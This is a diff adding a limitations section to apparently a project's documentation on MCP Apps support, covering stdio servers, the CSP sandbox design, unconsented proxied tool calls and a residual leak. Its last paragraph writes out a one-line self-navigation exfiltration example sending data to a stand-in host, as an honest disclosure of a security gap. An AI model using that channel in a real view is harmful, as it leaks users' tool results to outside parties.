@@ -2629,6 +2629,40 @@ somehow holds one reads as **Needs authorization** rather than being retried —
 since `refresh!` POSTs before it saves and a retry would leak the secret *and* lose the rotated
 refresh token.
 
+### MCP Apps renders only for remote servers, and only for servers named by hand
+
+[MCP Apps](/extend/mcp-apps/) support is off by default and per-server opt-in, which is deliberate
+and documented there. Three narrower things are limitations rather than design:
+
+**A stdio MCP server can never show a view.** Reading a `ui://` fragment means making a
+`resources/read` call, and for a stdio server that means the *web process* spawning the server — a
+process-spawning primitive on the request path. So `McpApps::Policy` offers only remote
+(`streamable-http` / `sse`) servers for opt-in, and most of the catalog is stdio. A stdio server that
+ships views is simply not renderable.
+
+**Zimmer is not the spec's double-iframe sandbox proxy.** SEP-1865 describes a host page plus a
+separate-origin *Sandbox* holding `allow-scripts allow-same-origin`, with the View inside it. Zimmer
+serves the fragment from its own endpoint under a CSP `sandbox` directive instead, so the document is
+opaque-origin however it is loaded and never holds `allow-same-origin` at all. The isolation is
+tighter, but the reserved `ui/notifications/sandbox-proxy-ready` and `sandbox-resource-ready`
+messages are not implemented, and a view that insists on the proxy handshake will not render.
+
+**A view's proxied `tools/call` needs no per-call consent and leaves no trace you can read.** The
+proxy forwards only tools the server marked `visibility: ["app"]`, only to the one server the
+fragment came from, and only up to `McpApps::RequestThrottle`'s ceiling — but within that, a view may
+call whatever it likes, whenever it likes, and the only record is the MCP server's own logs. The spec
+allows a host to require user consent per call; Zimmer does not, on the grounds that the per-server
+allowlist is where the consent was given. That is a real trade, and it is the reason the allowlist is
+the feature's load-bearing control rather than a convenience.
+
+**A view can still exfiltrate what it was given, by navigating itself.** The CSP closes `connect-src`
+by default, so a view that declares no `connectDomains` cannot `fetch` anywhere — but no CSP
+directive stops a sandboxed frame navigating *itself*, and `location.href = "https://elsewhere/?" + data`
+is a working channel for whatever the host handed it, chiefly the tool result. It is loud (the panel
+visibly becomes somebody else's page), it cannot reach anything Zimmer holds, and it is contained by
+the fact that an operator named the server — but "no network of any kind" is not literally true, and
+`navigate-to` was removed from the CSP spec, so there is nothing to turn on that would make it so.
+
 ---
 
 ## AIR catalog
